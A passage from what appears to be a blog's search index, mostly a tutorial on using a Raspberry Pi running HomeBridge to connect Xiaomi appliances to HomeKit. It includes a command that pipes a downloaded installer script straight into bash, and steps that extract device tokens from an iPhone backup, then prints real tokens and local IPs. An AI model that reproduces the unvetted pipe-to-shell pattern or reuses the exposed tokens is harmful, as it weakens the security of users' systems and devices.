at the bottom -&gt; select the export target -&gt; complete the export.9. CompletionTips You can first hide apps with green icons, such as Line and Messages, to prevent revealing the trick (since the cutout is based on green). You can use a blue background with blue cropping; other colors are also acceptable (but green/blue works best). There are more ways to play with the same principle, waiting for you to discover! Conclusionjust for fun‚Ä¶ I didn‚Äôt expect iMovie to be so powerful!Further Reading [Productivity Tools] Abandon Chrome and Embrace the Sidekick BrowserIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Smart WFH Home SetupÔΩúControl All Appliances with HomeKit & Raspberry Pi", "url": "/posts/zrealm-life/smart-wfh-home-setup-control-all-appliances-with-homekit-raspberry-pi-99db2a1fbfe5/", "categories": "ZRealm Life.", "tags": "english, ai-translation, homekit, iphone, homebridge, mi-home, lifestyle", "date": "2020-04-20 22:37:49 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Creating a Comfortable WFH Smart Home Environment, Control Appliances at Your ...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Creating a Comfortable WFH Smart Home Environment, Control Appliances at Your FingertipsDemonstration of Using Raspberry Pi as a HomeBridge Host to Connect All Mijia Appliances to HomeKitphoto by picjumbo.comAboutDue to the pandemic, people have been spending more time at home; especially when working from home, it‚Äôs best if all home appliances can be smartly controlled via an app. This way, you don‚Äôt have to keep getting up to turn on the lights or the rice cooker, which wastes a lot of time.I previously wrote an article titled ‚ÄúFirst Experience with Smart Home ‚Äî Apple HomeKit &amp; Xiaomi Mijia,‚Äù where I tried using HomeBridge to connect Xiaomi appliances to HomeKit. It proved theoretically feasible, but practical applications were rarely mentioned. This article is an advanced, comprehensive version of the previous one, including how to set up a Raspberry Pi as the host, with a step-by-step tutorial from start to finish.The reason is that I recently switched to an iPhone 11 Pro, which supports NFC automation in Shortcuts for iOS ‚â• 13. This means the phone can execute corresponding shortcuts when it senses an NFC tag. Although you can directly use an old EasyCard as an NFC tag, it takes up too much space and I don‚Äôt have that many cards. I asked around Guanghua but couldn‚Äôt find NFC tag stickers for sale. Finally, I found some on Shopee for $50 each and bought 5 to try out. The seller was thoughtful enough to separate them by color.NFC automation features are device-specific and only supported on iPhone XS/XS Max/XR/11/11 Pro/11 Pro Max. Earlier models like iPhone 8 do not have the NFC option.After testing a bit, I found an issue: when running the Mi Home app shortcut, you must enable the ‚ÄúShow When Run‚Äù option (otherwise it won‚Äôt actually execute). When the Tag is detected and the shortcut needs to run, you still have to unlock the iPhone, and the shortcut opens visibly during execution, so it can‚Äôt run silently in the background. Additionally, I tested that if the shortcut uses native Apple services (like HomeKit appliances), it can run directly in the background without unlocking. Also, HomeKit‚Äôs response speed and stability are much better than Mi Home.This makes a big difference in user experience, so I further explored connecting the Mi Home smart home series products to HomeKit. For those that support HomeKit, just bind them directly as this article does not repeat; for those that don‚Äôt support it, follow the tutorial in this article to bind them as well!My Mi Home Smart Home Project Mi Home Smart Camera Pan-Tilt Version 1080P Mi Home DC Inverter Electric Fan Mijia LED Smart Desk Lamp Xiaomi Air Purifier 3 Mijia Desk Lamp Pro (supports HomeKit natively) Mi Home LED Smart Bulb Color Version * 2 (natively supports HomeKit) How It WorksHere is a simple reference diagram: if a smart appliance supports HomeKit, it can connect directly. For smart appliances that do not support HomeKit, setting up a ‚ÄúHomeBridge‚Äù server (which must stay powered on) can bridge and connect them; within the same network environment (e.g., the same WiFi), the iPhone can freely control all HomeKit devices. However, when outside the local network, such as using a 4G mobile network, an Apple TV, HomePod, or iPad must act as the home hub and stay powered on at home to control HomeKit devices remotely. Without a home hub, opening the Home app outside will show ‚ÄúNo Response.‚Äù *If it is Xiaomi, the home appliances are controlled through Xiaomi‚Äôs servers. To be clear, there are security concerns as all data passes through Mainland China.Required EnvironmentSo, there are two devices that must always be on standby: one is the Apple TV/HomePod or iPad acting as the Home Hub. Currently, there is no solution to simulate this with other methods; you have to obtain these devices. Without them, you can only use HomeKit at home.** **Another computer that can be on standby 24 hours a day (such as your iMac/MacBook), an idle host (old iMac, Mac Mini), or a Raspberry Pi will work. *The Windows series has not been tested, but it should work as well!Or if you want to try it out, you can directly use your current computer (can be combined with the previous article).This article will demonstrate using a Raspberry Pi (Raspberry Pi 3B) operated on a MacBook Pro (MacOS 10.15.4), starting from setting up the Raspberry Pi environment from scratch. If you are not using a Raspberry Pi, you can skip directly to the HomeBridge integration with HomeKit section (the steps are the same there).Raspberry Pi 3B (special thanks to Lu Xun Huang )If using a Raspberry Pi, you will also need a micro SD card (not too large, I use 8GB), a card reader, an Ethernet cable (for setup, later you can connect via WiFi); and the necessary software for the Raspberry Pi: Raspberry Pi Desktop Operating System (Easy for Beginners, GUI Version) Etcher burning software Raspberry Pi Environment SetupBurning the Operating SystemAfter downloading the two required software, first insert the memory card into the card reader and connect it to the computer; then open the Etcher program (balenaEtcher)For the first option, select the newly downloaded Raspberry Pi OS image file ‚Äúxxxx.img‚Äù. For the second option, choose your memory card device, then click ‚ÄúFlash!‚Äù to start writing!At this point, a prompt will appear asking you to enter your MacOS password. After entering it, click ‚ÄúOk‚Äù to continue.Burning in progress‚Ä¶ please wait‚Ä¶.Verifying‚Ä¶ please wait‚Ä¶.Burning successful! *If a red Error appears, try formatting the memory card and burning it again.Reconnect the card reader to the computer, and create an empty file named ‚Äússh‚Äù ( or download here ) in the memory card directory. The file should be blank, with no extension, just a plain ‚Äússh‚Äù file; this allows us to connect to the Raspberry Pi using Terminal.sshSetting up Raspberry PiEject the memory card, insert it into the Raspberry Pi, connect the network cable, and power it on; ensure the MacBook and Raspberry Pi are on the same network.Check the IP Address Assigned to the Raspberry PiThe assigned IP address of the Raspberry Pi is: 192.168.0.110 (Please replace all IP addresses mentioned in this article with the ones you have found) It is recommended to set the Raspberry Pi to a static/reserved IP; otherwise, the IP address may change after rebooting and reconnecting, requiring you to check it again.Use SSH to Access the Raspberry Pi for OperationsOpen Terminal and enter:ssh pi@your_raspberry_pi_IP_addressIf prompted, enter yes. The default password is: raspberryConnection Successful! *If you encounter a WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED error message, open /Users/xxxx/.ssh/known_hosts with a text editor and clear its contents.Basic Raspberry Pi Tools Installation and Setup Enter the following command to install the Vim editor:sudo apt-get install vim2. Fix the following language warnings:perl: warning: Setting locale failed.perl: warning: Please check that your locale settings: LANGUAGE = (unset), LC_ALL = (unset), LC_LANG = \"zh_TW.UTF-8\", LANG = \"zh_TW.UTF-8\" are supported and installed on your system.perl: warning: Falling back to the standard locale (\"C\").Inputvi .bashrcPress ‚ÄúEnter‚Äù to proceedPress ‚Äúi‚Äù to enter insert modeMove to the very bottom of the file and add a line: export LC_ALL=CPress ‚ÄúEsc‚Äù and type ‚Äú:wq!‚Äù to save and exit.Then run source .bashrc to update.3. Install nvm to manage nodejs/npm:curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.11/install.sh \\\\| bash4. Install the latest version of nodejs using nvm:nvm install 12.16.2 *Here, choose to install version ‚Äú12.16.2‚Äù5. Confirm Environment Installation Completion:Enter the following commandnpm -vandnode -vConfirmationNo error messages!6. Establish nodejs connectionEnter the following commandwhich nodeGet the path information of nodejs locationEnter Againsudo ln -fs paste the path found by which node here (without \"double quotes\") /usr/local/bin/nodeCreate LinksSetup Complete!Enable Raspberry Pi VNC Remote Desktop FunctionHere, although we are installing the GUI version, you can of course connect the Raspberry Pi to a keyboard and HDMI and use it like a regular computer. However, for convenience, we will control the Raspberry Pi via remote desktop.Input:sudo raspi-configEnter Settings:Select the fifth item, ‚ÄúInterfacing Options‚ÄùChoose the third option ‚ÄúP3 VNC‚ÄùUse ‚Äú ‚Üê ‚Äú to select ‚Äú Yes ‚Äú to turn onVNC Remote Desktop Function Enabled Successfully!Use ‚Äú‚Üí‚Äù to go directly to ‚ÄúFinish‚Äù to exit the settings interface.Add VNC Remote Desktop Service to Startup ItemsWe want the VNC remote desktop service to start automatically when the Raspberry Pi boots up.Inputsudo vim /etc/init.d/vncserverPress ‚ÄúEnter‚Äù to proceedPress ‚Äúi‚Äù to enter insert mode#!/bin/sh### BEGIN INIT INFO# Provides: vncserver# Required-Start: $local_fs# Required-Stop: $local_fs# Default-Start: 2 3 4 5# Default-Stop: 0 1 6# Short-Description: Start/stop vncserver### END INIT INFO# More details see:# http://www.penguintutor.com/linux/vnc### Customize this entry# Set the USER variable to the name of the user to start vncserver underexport USER='pi'### End customization requiredeval cd ~$USERcase \"$1\" in start) su $USER -c '/usr/bin/vncserver -depth 16 -geometry 1024x768 :1' echo \"Starting VNC server for $USER \" ;; stop) su $USER -c '/usr/bin/vncserver -kill :1' echo \"vncserver stopped\" ;; *) echo \"Usage: /etc/init.d/vncserver {start\\\\|stop}\" exit 1 ;;esacexit 0Press ‚ÄúCommand‚Äù + ‚ÄúC‚Äù and ‚ÄúCommand‚Äù + ‚ÄúV‚Äù to copy and paste the above content, then press ‚ÄúEsc‚Äù and type ‚Äú:wq!‚Äù to save and exit.Input again:sudo chmod 755 /etc/init.d/vncserverModify file permissions.Input again:sudo update-rc.d vncserver defaultsAdd to startup items.Final Input:sudo rebootRestart the Raspberry Pi. After the restart is complete, reconnect via SSH following the previous steps. Connecting Using a VNC Client:Here, the Chrome app ‚ÄúVNC¬Æ Viewer for Google Chrome‚Ñ¢‚Äù is used. After installation and launch, enter Raspberry Pi IP address:1. Please note that the Port:1 must be added! *I cannot connect using the Mac‚Äôs built-in VNC://, unsure of the reason.Click ‚ÄúConnect‚Äù.Click ‚ÄúOK‚Äù.Enter login username and password, same as SSH connection, username pi with default password raspberry.Successfully connected!Complete Raspberry Pi Initialization Setup:Next are all graphical interfaces! Very easy!Set Language, Region, and Time Zone.Change the default Raspberry Pi password by entering the password you want to set.Directly proceed to the ‚ÄúNext‚Äù step.Set up WiFi connection, so you don‚Äôt need to plug in the cable afterward. *Note that the Raspberry Pi‚Äôs IP address may change, so check the router again.If you‚Äôre not in a hurry, choose ‚ÄúNext‚Äù to update the current operating system! *The update takes about 20 to 30 minutes (depending on your internet speed)After the update is complete, click ‚ÄúRestart‚Äù to reboot.Raspberry Pi Environment Setup Complete!HomeBridge InstallationOfficially entering the main event: installing and using HomeBridge.Use Terminal to SSH into the Raspberry Pi or directly use the Terminal within the VNC remote desktop.Input:npm -g install homebridge --unsafe-perm^( Without sudo )Install HomeBridgeInstallation Complete!Create/Modify Configuration File (config.json):To facilitate editing, use VNC remote desktop to connect to the Raspberry Pi (or directly use commands) :Click the top-left corner to open ‚ÄúFile Manager‚Äù -&gt; Go to ‚Äú/home/pi/.homebridge‚ÄùIf you don‚Äôt see the ‚Äúconfig.json‚Äù file, right-click on the blank area, select ‚ÄúNew File‚Äù -&gt; enter the file name ‚Äúconfig.json‚ÄùRight-click on ‚Äúconfig.json‚Äù and open it with ‚ÄúText Editor‚Äù.Paste the following basic configuration content:{ \"bridge\": { \"name\": \"Homebridge\", \"username\": \"CC:22:3D:E3:CE:30\", \"port\": 51826, \"pin\": \"123-45-568\"}No need to make special changes to the content, just copy it as is! Remember to save your work!Done!Binding HomeBridge to HomekitInput:homebridge start^( Without sudo )Enable *If you encounter an error like ‚ÄúError: Service name is already in use on the network‚Äù or the port is occupied, try deleting the service, using homebridge restart to restart, or rebooting the device. If you see an error like ‚Äúwas not registered by any plugin,‚Äù it means you haven‚Äôt installed the corresponding homebridge plugin yet. If you make changes to the configuration file (config.json) during startup, you need to update it accordingly: sudo homebridge restart Restart HomeBridge Press ‚ÄúControl‚Äù + ‚ÄúC‚Äù to close and exit the HomeBridge service in Terminal. Take out your iPhone and open the ‚ÄúHome‚Äù app. Tap the ‚Äú+‚Äù in the top right corner of ‚ÄúHome,‚Äù select ‚ÄúAdd Accessory,‚Äù and scan the QR code that appears.At this point, you should see ‚ÄúAccessory Not Found.‚Äù Don‚Äôt worry! This is because we haven‚Äôt added any accessories to the HomeBridge bridge yet. It‚Äôs okay, let‚Äôs continue.At least one accessory is required to scan and add! ! ! (Using a camera as an example) :At least one accessory is required to scan and add! ! ! (Using a camera as an example) :At least one accessory is required to scan and add! ! ! (Using a camera as an example) :The first time you scan, a warning window will appear. Just click ‚ÄúForce Join‚Äù to proceed! After adding once, you don‚Äôt need to scan additional accessories again; they will update automatically!Add HomeBridge Service to Raspberry Pi Startup Items AutomaticallyLike VNC remote desktop service, we also want the HomeBridge service to start automatically when the Raspberry Pi boots up. Otherwise, we would have to manually connect and enable it again after each reboot.Input:which homebridgeGet homebridge Path InformationRemember this path.Enter again:sudo vim /etc/init.d/homebridgePress ‚ÄúEnter‚Äù to proceedPress ‚Äúi‚Äù to enter edit mode#!/bin/sh### BEGIN INIT INFO# Provides:# Required-Start: $remote_fs $syslog# Required-Stop: $remote_fs $syslog# Default-Start: 2 3 4 5# Default-Stop: 0 1 6# Short-Description: Start daemon at boot time# Description: Enable service provided by daemon.### END INIT INFOdir=\"/home/pi\"cmd=\"DEBUG=* Paste the path found by which homebridge here\"user=\"pi\"name=`basename $0`pid_file=\"/var/run/$name.pid\"stdout_log=\"/var/log/$name.log\"stderr_log=\"/var/log/$name.err\"get_pid() {cat \"$pid_file\"}is_running() {[ -f \"$pid_file\" ] &amp;&amp; ps -p `get_pid` &gt; /dev/null 2&gt;&amp;1}case \"$1\" instart)if is_running; thenecho \"Already started\"elseecho \"Starting $name\"cd \"$dir\"if [ -z \"$user\" ]; thensudo $cmd &gt;&gt; \"$stdout_log\" 2&gt;&gt; \"$stderr_log\" &amp;elsesudo -u \"$user\" $cmd &gt;&gt; \"$stdout_log\" 2&gt;&gt; \"$stderr_log\" &amp;fiecho $! &gt; \"$pid_file\"if ! is_running; thenecho \"Unable to start, see $stdout_log and $stderr_log\"exit 1fifi;;stop)if is_running; thenecho -n \"Stopping $name..\"kill `get_pid`for i in 1 2 3 4 5 6 7 8 9 10# for i in `seq 10`doif ! is_running; thenbreakfiecho -n \".\"sleep 1doneechoif is_running; thenecho \"Not stopped; may still be shutting down or shutdown may have failed\"exit 1elseecho \"Stopped\"if [ -f \"$pid_file\" ]; thenrm \"$pid_file\"fifielseecho \"Not running\"fi;;restart)$0 stopif is_running; thenecho \"Unable to stop, will not attempt to start\"exit 1fi$0 start;;status)if is_running; thenecho \"Running\"elseecho \"Stopped\"exit 1fi;;*)echo \"Usage: $0 {start\\\\|stop\\\\|restart\\\\|status}\"exit 1;;esacexit 0To:cmd=\"DEBUG=* Paste here the path you found with which homebridge\"Replace with the path information you found (no quotation marks needed)Type ‚ÄúCommend‚Äù + ‚ÄúC‚Äù and ‚ÄúCommend‚Äù + ‚ÄúV‚Äù to copy and paste the above content, then press ‚ÄúEsc‚Äù and type ‚Äú:wq!‚Äù to save and exit.Enter again:sudo chmod 755 /etc/init.d/homebridgeChange file permissions.Final Input:sudo update-rc.d homebridge defaultsAdd to startup items.Done! You can directly use sudo /etc/init.d/homebridge start to start the homebridge service. You can also use: tail -f /var/log/homebridge.err to view startup error messages, and tail -f /var/log/homebridge.log to view logs.Preparation Before Connecting Mijia Smart AppliancesAfter Homebridge is up and running, we can start adding all Mi Home appliances to Homebridge and connect them to HomeKit one by one!First, we need to add all Mijia smart appliances to the ‚ÄúMijia APP‚Äú, as we will obtain the information to connect to HomeBridge from it.After Smart Appliances Are Added to the Mi Home App:Connect the iPhone to the Mac, open the Finder/iTunes interface, and select the connected phone.Select backup to ‚ÄúThis Computer‚Äù, do not check ‚ÄúEncrypt local backup‚Äù, then click ‚ÄúBack Up Now‚Äù.After completing the backup, download and install the backup viewer software: iBackupViewerOpen ‚ÄúiBackupViewer‚Äù At first launch, you will be prompted to go to Mac ‚ÄúSystem Preferences‚Äù - ‚ÄúSecurity &amp; Privacy‚Äù - ‚ÄúPrivacy‚Äù - ‚Äú+‚Äù - add ‚ÄúiBackupViewer‚Äù **If you have privacy concerns, you can disable internet access for this software and remove it after use*After reopening iBackupViewer and successfully loading the backup file, click on the ‚ÄúRecently Backed Up Phone.‚ÄùSelect the ‚ÄúApp Store‚Äù IconOn the left, find ‚ÄúMi Home APP (MiHome.app)‚Äù -&gt; on the right, locate the ‚Äúdigital_mihome.sqlite‚Äù file and ‚Äúselect‚Äù it -&gt; top right corner ‚ÄúExport‚Äù -&gt; ‚ÄúSelected Files‚Äù *If there are two ‚Äúnumber_mihome.sqlite‚Äù files, choose the one with the newest Created time.Drag the exported Êï∏Â≠ó_mihome.sqlite file into this website to view its contents:You can change the query syntax to:SELECT `ZDID`,`ZNAME`,`ZTOKEN` FROM 'ZDEVICE' LIMIT 0,30Only display the required field information (if specific appliance kits need additional field information, you can add those for filtering). ZDID: Device ID ZNAME: Device Name ZTOKEN: Install ZToken ZTOKEN cannot be used directly; it must be converted to ‚ÄúToken‚Äù before use.Here is an example of converting a camera‚Äôs ZToken to a Token:First, we get the content of the camera‚Äôs ZToken field from the list above.7f1a3541f0433b3ccda94beb856c2f5ba2b15f293ce0cc398ea08b549f9c74050143db63ee66b0cdff9f69917680151eBut the TOKEN obtained here cannot be used yet; we still need to convert it.Open the website http://aes.online-domain-tools.com/: Paste the copied ZTOKEN into the ‚ÄúInput Text‚Äù field and select ‚ÄúHex‚Äù. Enter the key ‚Äú00000000000000000000000000000000‚Äù with 32 zeros, still select ‚ÄúHex‚Äù. Then press ‚ÄúDecrypt!‚Äù to convert. Select all and copy the output content of the two lines at the bottom right &amp; remove the spaces to get the result we want Token. ‚Äú6d304e6867384b704b4f714d45314a34‚Äù is the Token result we need! *For obtaining the Token, I tried using ‚Äúmiio‚Äù to sniff it directly, but it seems the Mi Home firmware has been updated, making this method no longer a quick and convenient way to get the Token!Finally, we also need to know the device‚Äôs IP address (using the camera as an example here):Open the Mi Home APP ‚Üí Camera ‚Üí Top right corner ‚Äú‚Ä¶‚Äù ‚Üí Settings ‚Üí Network Information to get the IP address! Record ZDID/Token/IP information for later use.Integrate Mijia Smart Appliances into HomeBridge One by OneAccording to the packages and connection information required by each device, install and configure them one by one, then add them to HomeBridge. Next, open Terminal to SSH into the Raspberry Pi or directly use the Terminal in the VNC remote desktop to continue the following tasks‚Ä¶.1. Mijia Camera PTZ Version:Install the MijiaCamera homebridge plugin via Terminal ( without sudo ):npm install -g homebridge-mijia-cameraReferring to the previous tutorial on modifying the configuration file (config.json), add the accessories section to the file:{ \"bridge\":{ \"name\":\"Homebridge\", \"username\":\"CC:22:3D:E3:CE:30\", \"port\":51826, \"pin\":\"123-45-568\" }, \"accessories\":[ { \"accessory\":\"MijiaCamera\", \"name\":\"Mi Camera\", \"ip\":\"\", \"token\":\"\" } ]}accessories: Add the Mi Home camera settings, with ip set to the camera‚Äôs IP and token set to the token from the previous tutorial. Remember to save your work!Then, follow the Homebridge section instructions to start/restart/scan and add Homebridge; you will be able to see the camera controls in the ‚ÄúHome‚Äù app.Controllable item: Camera On/Off2. Mijia DC Inverter Electric FanRun the command below in Terminal to install the homebridge-mi-fan homebridge plugin (without sudo):npm install -g homebridge-mi-fanReferring to the previous tutorial on modifying the configuration file (config.json), add the platforms section in the file (if it already exists, add a new subsection within it separated by a comma):{ \"bridge\":{ \"name\":\"Homebridge\", \"username\":\"CC:22:3D:E3:CE:30\", \"port\":51826, \"pin\":\"123-45-568\" }, \"platforms\":[ { \"platform\":\"MiFanPlatform\", \"deviceCfgs\":[ { \"type\":\"MiDCVariableFrequencyFan\", \"ip\":\"\", \"token\":\"\", \"fanName\":\"room fan\", \"fanDisable\":false, \"temperatureName\":\"room temperature\", \"temperatureDisable\":true, \"humidityName\":\"room humidity\", \"humidityDisable\":true, \"buzzerSwitchName\":\"fan buzzer switch\", \"buzzerSwitchDisable\":true, \"ledBulbName\":\"fan led switch\", \"ledBulbDisable\":true } ] } ]}platforms: Add Mi Home fan configuration info, with ip set to the camera‚Äôs ip, token set to the token from the previous tutorial, and humidity/temperature controlling whether to link and display humidity and temperature meter info.type must include the corresponding model text, supporting four different fan models: ZhiMi DC Variable Frequency Floor Fan: ZhiMi DC Variable Frequency Floor Fan ZhiMi Natural Wind Fan: ZhiMiNaturalWindFan Mi Home DC Inverter: MiDCVariableFrequencyFan (Sold in Taiwan) Mijia Fan: DmakerFan Please enter your own fan model. Remember to save your work!Then, follow the Homebridge chapter to start/restart/scan and add Homebridge; you will be able to see the camera controls in the ‚ÄúHome‚Äù app.Controllable items: Fan on/off, wind speed adjustment3. Xiaomi Air Purifier 3Run the following command in Terminal to install the homebridge-xiaomi-air-purifier3 homebridge plugin (without sudo):npm install -g homebridge-xiaomi-air-purifier3Refer to the previous tutorial on modifying the configuration file (config.json), add the accessories section to the file (if it already exists, add a new subsection within it separated by a comma) :{ \"bridge\":{ \"name\":\"Homebridge\", \"username\":\"CC:22:3D:E3:CE:30\", \"port\":51826, \"pin\":\"123-45-568\" }, \"accessories\":[ { \"accessory\":\"XiaomiAirPurifier3\", \"name\":\"Xiaomi Air Purifier\", \"did\":\"\", \"ip\":\"\", \"token\":\"\", \"pm25_breakpoints\":[ 5, 12, 35, 55 ] } ]}accessories: Add Mi Home fan configuration info, with ip set to the camera‚Äôs ip, token set to the token from the previous tutorial, and did set to zdid Remember to save your work!Then, follow the Homebridge section instructions to start/restart/scan and add Homebridge; you will be able to see the camera controls in the ‚ÄúHome‚Äù app.Controllable items: Air purifier power switch, fan speed adjustmentViewable items: Current temperature and humidity4. Mijia LED Smart Desk LampInstall the homebridge-yeelight-wifi homebridge plugin via Terminal (without sudo):npm install -g homebridge-yeelight-wifiReferring to the previous tutorial on modifying the configuration file (config.json), add the platforms section in the file (if it already exists, add a new subsection within it separated by a comma) :{ \"bridge\":{ \"name\":\"Homebridge\", \"username\":\"CC:22:3D:E3:CE:30\", \"port\":51826, \"pin\":\"123-45-568\" }, \"platforms\":[ { \"platform\":\"yeelight\", \"name\":\"Yeelight\" } ]}No need to pass any special parameters! For more detailed settings, refer to the official documentation (such as brightness/color temperature‚Ä¶). Remember to save your work!The smart desk lamp also needs to be linked to the Yeelight app, and then enable ‚ÄúLocal Network Control‚Äù to allow Homebridge to control it. Download and install the ‚ÄúYeelight‚Äù app on your iPhoneSearch ‚ÄúYeelight‚Äù on the App Store and install itAfter installation, open the Yeelight APP -&gt; ‚ÄúAdd Device‚Äù -&gt; find ‚ÄúMi Home Desk Lamp‚Äù -&gt; re-pair and bind.The final step is to enable ‚ÄúLocal Network Control‚Äù. If you accidentally didn‚Äôt open it, go to the ‚ÄúDevices‚Äù page -&gt; select the desk lamp device -&gt; tap the ‚Äú‚ñ≥‚Äù tab at the bottom right -&gt; tap ‚ÄúLocal Network Control‚Äù to enter settings -&gt; turn on Local Network Control Honestly, this is really bad. The Mi Home app itself doesn‚Äôt have this toggle feature; you have to bind it to the Yeelight app, and you can‚Äôt unbind or rebind it back to Mi Home‚Ä¶ otherwise, it will stop working.Then, follow the Homebridge section instructions to start/restart/scan and add Homebridge; you will be able to see the camera controls in the ‚ÄúHome‚Äù app.Controllable Items: Light switch, color temperature adjustment, brightness adjustmentOther Mijia smart home appliances homebridge packages:My final config.json looks like this:{ \"bridge\":{ \"name\":\"Homebridge\", \"username\":\"CC:22:3D:E3:CE:30\", \"port\":51826, \"pin\":\"123-45-568\" }, \"accessories\":[ { \"accessory\":\"MijiaCamera\", \"name\":\"Mi Camera\", \"ip\":\"192.168.0.105\", \"token\":\"6d304e6867384b704b4f714d45314a34\" }, { \"accessory\":\"XiaomiAirPurifier3\", \"name\":\"Xiaomi Air Purifier\", \"did\":\"270033668\", \"ip\":\"192.168.0.108\", \"token\":\"5c3eeb03065fd8fc6ad10cae1f7cce7c\", \"pm25_breakpoints\":[ 5, 12, 35, 55 ] } ], \"platforms\":[ { \"platform\":\"MiFanPlatform\", \"deviceCfgs\":[ { \"type\":\"MiDCVariableFrequencyFan\", \"ip\":\"192.168.0.106\", \"token\":\"dd1b6f582ba6ce34f959bbbc1c1ca59f\", \"fanName\":\"room fan\", \"fanDisable\":false, \"temperatureName\":\"room temperature\", \"temperatureDisable\":true, \"humidityName\":\"room humidity\", \"humidityDisable\":true, \"buzzerSwitchName\":\"fan buzzer switch\", \"buzzerSwitchDisable\":true, \"ledBulbName\":\"fan led switch\", \"ledBulbDisable\":true } ] }, { \"platform\":\"yeelight\", \"name\":\"Yeelight\" } ]}For everyone‚Äôs reference!The Mi Home appliances I used are as shown in the tutorial above. For others I don‚Äôt have, I didn‚Äôt try them. You can check yourself on npm (homebridge-plugin XXX English name), then follow the similar installation and setup steps as above to integrate them!Here are a few Homebridge plugins I found but haven‚Äôt tried (no guarantee they work): Xiaomi Air Purifier 1st Gen: homebridge-mi-air-purifier Mi Home Smart Socket Series: homebridge-mi-outlet Xiaomi Robot Vacuum: homebridge-mi-robot_vacuum Mi Home Smart Gateway: homebridge-mi-aqara Tips It is recommended to set all Mi Home appliances to static/reserved IPs on the router. Otherwise, the IP addresses may change, requiring you to update the config.json settings again. If you find that all the steps are correct but errors still occur or HomeKit keeps showing ‚ÄúNo Response,‚Äù try again; if the issue persists, it may mean the plugin is no longer valid and you need to find another plugin to connect. (You can check the GitHub issues) Functionality failure and slow response; this is also unresolved. You can submit an issue to notify the author and wait for an update. Since it is an open-source project, you can‚Äôt expect too much! After binding each appliance, you can start Homebridge once, then check on your iPhone if it works. If it does, you can press ‚ÄúControl‚Äù + ‚ÄúC‚Äù to stop it; after all appliances are bound, restart the Raspberry Pi so it automatically starts the Homebridge service in the background after reboot. This is what we want. ConclusionYou can also go to ‚ÄúSettings‚Äù -&gt; ‚ÄúControl Center‚Äù -&gt; ‚ÄúCustomize‚Äù and add the ‚ÄúHome‚Äù app to quickly access HomeKit from the Control Center dropdown!After connecting everything to HomeKit, there‚Äôs only one word: ‚ÄúAwesome‚Äù! The switches respond faster; the only downside is I don‚Äôt have a home hub to enable remote control. This concludes the advanced Homebridge guide. Thank you for reading.Back to the beginning of the article, once everything is added to HomeKit, we can seamlessly use the automation features of iOS ‚â• 13 Shortcuts.Later, I want to study how the Homebridge plugin works. It seems very interesting! So if a Homebridge plugin doesn‚Äôt meet your needs or a plugin breaks and you can‚Äôt find a replacement, just wait for me to research it!Home assistantThere is another smart home platform called Homeassistant that can be installed on a Raspberry Pi (but note: a 2A power supply is required to start it); I have also installed Homeassistant to try it out. It offers a full GUI with graphical operations, allowing you to connect home appliances with just a few clicks. I plan to explore it further later. It feels like an alternative to the Mi Home platform, and it is more suitable if you have many IoT devices from different manufacturers.References https://www.domoticz.cn/forum/viewtopic.php?t=52 https://or2.in/2017/07/02/Homekit-and-MiJia-with-pi/#3-%E5%8F%B7%E5%A4%96-%E5%BC%80%E5%90%AF%E5%8F%AF%E8%A7%86%E5%8C%96VNC Further Reading Xiaomi Smart Home New Purchases (AI Speaker, Temperature and Humidity Sensor, Scale 2, DC Inverter Fan) iOS ‚â• 13.1 Automation with ‚ÄúShortcuts‚Äù for Mijia Smart Home (Using the built-in Shortcuts app in iOS ‚â• 13.1 to complete automation) Mi Home APP / Xiao Ai Speaker Region Issues Smart Home First Experience ‚Äî Apple HomeKit &amp; Xiaomi Mijia (Mijia Smart Camera and Mijia Smart Desk Lamp, HomeKit Setup Tutorial) If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS HLS CacheÔΩúOptimize AVPlayer Streaming with Real-Time Caching Techniques", "url": "/posts/zrealm-dev/ios-hls-cache-optimize-avplayer-streaming-with-real-time-caching-techniques-d796bf8e661e/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, hls, ios, ios-app-development, cache, reverse-proxy", "date": "2020-04-09 01:12:17 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Exploring Practical Methods for iOS HLS Cache ImplementationHow to Enable Simu...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Exploring Practical Methods for iOS HLS Cache ImplementationHow to Enable Simultaneous Playback and Caching When Using AVPlayer to Play m3u8 Streaming Media Filesphoto by Mihis Alex[2023/03/12] Update Next article: ‚ÄúComplete Guide to Implementing Local Cache with AVPlayer‚Äù teaches you how to implement AVPlayer caching.I have open-sourced my previous implementation. Feel free to use it if you need. Custom cache strategies can use PINCache or others‚Ä¶ Externally, just call the AVAsset factory with the URL, and the AVAsset will support caching. Using Combine to implement data flow strategy Wrote some tests AboutHTTP Live Streaming (HLS) is an Apple-proposed HTTP-based streaming media network transmission protocol.For 